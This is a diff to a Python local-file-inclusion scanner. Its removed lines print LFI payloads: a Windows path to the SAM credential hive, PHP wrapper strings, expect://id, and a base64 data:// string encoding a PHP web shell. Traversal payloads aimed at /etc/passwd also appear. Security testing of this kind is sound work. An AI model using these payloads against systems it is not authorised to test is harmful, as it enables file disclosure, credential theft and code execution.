@@ -13,6 +13,7 @@ Adim 8 - Siniflar:
 """
 from __future__ import annotations
 
+import base64
 import logging
 import random
 import re
@@ -71,29 +72,6 @@ _PROC_SELF_FILES = [
     "/proc/self/status",
 ]
 
-# Windows-specific LFI paths
-_WINDOWS_FILES = [
-    "C:\\Windows\\win.ini",
-    "C:\\Windows\\System32\\drivers\\etc\\hosts",
-    "C:\\boot.ini",
-    "%SYSTEMROOT%\\win.ini",
-    "C:\\Windows\\System32\\config\\sam",
-    "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\ex.log",
-]
-
-# PHP wrapper payloads (expanded)
-_PHP_WRAPPER_PAYLOADS = [
-    "php://filter/convert.base64-encode/resource=index.php",
-    "php://filter/convert.base64-encode/resource=config.php",
-    "php://filter/convert.base64-encode/resource=../config.php",
-    "php://filter/read=string.toupper/resource=index.php",
-    "php://input",
-    "phar://./test.phar/test.txt",
-    "expect://id",
-    "zip://shell.jpg%23shell.php",
-    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
-]
-
 # Null-byte bypass suffix (PHP < 5.3.4)
 _NULL_BYTE = "%00"
 
@@ -104,9 +82,6 @@ _DOUBLE_ENCODED_TRAVERSAL = [
     "..%255c",          # double-encoded ..\
     "%252e%252e%255c",
 ]
-
-# Path truncation payload (4096-char padding to bypass basename() checks)
-_PATH_TRUNCATION_PAYLOAD = "../" * 512 + "etc/passwd"
 
 _TRAVERSAL_PREFIXES = (
     ["../" * n for n in range(2, 8)]
@@ -225,7 +200,6 @@ class LFIDirectoryTraversalProber(BaseScanner):
                         # base64 decode attempt
                         decoded = ""
                         try:
-                            import base64
                             decoded = base64.b64decode(body.strip()[:500]).decode("utf-8", errors="replace")
                         except Exception as _fix_e:
                             logger.debug(f"[scanners.lfi] {type(_fix_e).__name__}: {_fix_e!r}")
@@ -549,7 +523,6 @@ class PHPWrapperProber(BaseScanner):
     ]
 
     def run(self, target: str, **kwargs) -> List[Dict]:
-        import base64
         results: List[Dict] = []
 
         # --- php://filter base64 source disclosure ---
@@ -743,7 +716,6 @@ class LFIScanner(BaseScanner):
         ]
         for prober in probers:
             try:
-                prober.target = target
                 res = prober.run(target, **kwargs)
                 all_results.extend(res)
             except Exception as exc:
@@ -751,7 +723,7 @@ class LFIScanner(BaseScanner):
         return all_results
 
 
-def run(url: str, session=None, debug: bool = False, **kwargs) -> List[Dict]:
+def run(url: str, session=None, results: dict = None, debug: bool = False, **kwargs) -> List[Dict]:
     """Module-level adapter."""
-    scanner = LFIScanner(session=session, debug=debug)
+    scanner = LFIScanner(session=session, results=results or {}, debug=debug)
     return scanner.run(url, **kwargs)
